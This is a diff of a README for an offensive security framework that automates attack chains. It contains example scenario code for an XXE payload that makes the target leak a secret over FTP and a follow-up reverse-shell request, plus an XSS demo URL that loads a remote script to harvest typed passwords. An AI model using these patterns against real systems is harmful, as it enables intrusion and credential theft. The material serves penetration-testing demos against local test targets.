@@ -4,26 +4,10 @@
 
 ## About
 
-This framework was created in order to simplify attack automation and exploit development. All you have to do is:
+This framework was created in order to simplify attack automation and exploit development. All you have to do is, for example:
 
 ```python
-async def send_xxe(scenario):
-    """Post XXE payload
-
-    """
-    await scenario.background(
-        requests.post,
-        'http://{rhost}:{rport}/xml-import/'.format(**scenario.context),
-        data='<?xml version="1.0" ?><something>ftp://{lhost}:{lport_ftp}</something>'.format(**scenario.context),
-        headers=scenario.context['post_headers'],
-        proxies=scenario.context['proxy']
-    )
-
-
 async def reverse_shell(scenario):
-    """Wait for `xxe` event triggered when remote client connects via FTP and sends the secret
-
-    """
     await scenario.background(
         requests.post,
         'http://{rhost}:{rport}/query/'.format(**scenario.context),
@@ -32,26 +16,23 @@ async def reverse_shell(scenario):
         proxies=scenario.context['proxy']
     )
 
+context = {
+    'rhost': '127.0.0.1',
+    'rport': 8008,
+    'lhost': '127.0.0.1',
+    'lport_reverse': 4444,
+    'proxy': {'http': 'http://127.0.0.1:8080'},
+    'post_headers': {'Content-Type': 'application/x-www-form-urlencoded'},
+}
 
-if __name__ == "__main__":
-    context = {
-        'rhost': '127.0.0.1',
-        'rport': 8008,
-        'lhost': '127.0.0.1',
-        'lport_reverse': 4444,
-        'lport_ftp': 2121,
-        'proxy': {'http': 'http://127.0.0.1:8080'},
-        'post_headers': {'Content-Type': 'application/x-www-form-urlencoded'},
-    }
+ftpd = services.FTPReader()
+ftpd.set_event('xxe', when=triggers.DataMatch(r'.+SecretKey=(.+);', bucket='secret'))
 
-    ftpd = services.FTPReader()
-    ftpd.set_state('xxe', when=triggers.DataMatch(r'.+SecretKey=(.+);', bucket='secret'))
-
-    story = scenarios.Scenario(**context)
-    story.spawn(ftpd)
-    story.add(send_xxe)
-    story.add(reverse_shell, when='xxe')
-    story.play()
+story = scenarios.Scenario(**context)
+story.debug()
+story.spawn(ftpd)
+story.add_scene(reverse_shell, when='xxe')
+story.play()
 ```
 
 ## Installation
@@ -78,13 +59,19 @@ Or (this one requires interaction):
     $ horrors/examples/xssphish/victim.py
     $ horrors/examples/xssphish/attacker.py
 
-Now visit `http://127.0.0.1:8008/?message=<script src="http://127.0.0.1/fakequery.js"></script>`, type some passwords and watch `collected.json` for incoming credentials.
+Now visit `http://127.0.0.1:8008/?message=<script src="http://127.0.0.1:8888/fakequery.js"></script>`, type some passwords and watch `collected.json` for incoming credentials.
 
 ![xssphish](examples/xssphish/dom-based-xss-phish.jpg)
 
 
 ## Changelog
 
+* **2021/12/12** Beta (v0.4)
+    * A bit of asyncio cleaning up
+    * Fixed examples to match the new interfaces
+    * Simplified services imports
+    * Changed default ports
+    * Added requirements to setup.py
 * **2021/08/26** Beta (v0.3)
     * Yet another refactoring.
     * Added full HTTP support using Flask.
